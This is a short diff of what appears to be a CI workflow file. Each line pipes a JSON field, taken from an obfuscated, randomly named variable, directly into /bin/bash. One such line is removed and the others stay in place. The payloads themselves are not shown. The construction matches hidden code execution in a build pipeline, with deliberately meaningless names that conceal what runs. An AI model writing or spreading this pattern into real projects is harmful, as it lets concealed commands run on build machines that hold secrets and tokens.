@@ -24,7 +24,6 @@ jobs:
           echo $augr3 | jq -r .t38 | /bin/bash
           echo $aof06822 | jq -r .qfawm11 | /bin/bash
           printf '%s' "$ntdg1317" | jq -r .at632 | /bin/bash
-          printf '%s' "$r045" | jq -r .ydum634 | /bin/bash
           echo $xym594 | jq -r .ci0311 | /bin/bash
           printf '%s' "$c604" | jq -r .h909 | /bin/bash
           printf '%s' "$tkqxa7135" | jq -r .gt8 | /bin/bash
